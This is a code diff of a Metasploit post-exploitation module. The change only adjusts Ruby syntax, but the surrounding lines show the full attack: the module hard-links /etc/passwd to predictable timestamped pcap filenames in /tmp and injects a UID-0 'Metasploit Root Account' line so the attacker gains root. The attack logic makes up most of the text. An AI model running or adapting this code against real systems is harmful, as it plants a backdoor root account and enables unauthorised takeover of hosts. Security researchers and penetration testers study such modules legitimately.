@@ -72,13 +72,13 @@ class Metasploit3 < Msf::Post
 		initial_size = cmd_exec("cat /etc/passwd | wc -l")
 		i = 60
 		while(true) do
-			if (i == 60) then
+			if (i == 60)
 				# 0a2940: cmd_exec is slow, so send 1 command to do all the links
 				cmd_exec("for i in $(seq 0 120); do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
 				i = 0
 			end
 			i = i+1
-			if(cmd_exec("cat /etc/passwd | wc -l") != initial_size)  then
+			if (cmd_exec("cat /etc/passwd | wc -l") != initial_size)
 				# PCAP is flowing
 				pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
 				print_status("Sending file contents payload to #{session.session_host}")
@@ -93,7 +93,6 @@ class Metasploit3 < Msf::Post
 		end
 
 		if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true") 
-		then
 			print_good("Success. You should now be able to login or su to the '" + datastore['USERNAME'] + "' account")
 		else
 			print_error("Failed. You should manually verify the '" + datastore['USERNAME'] + "' user has not been added")	
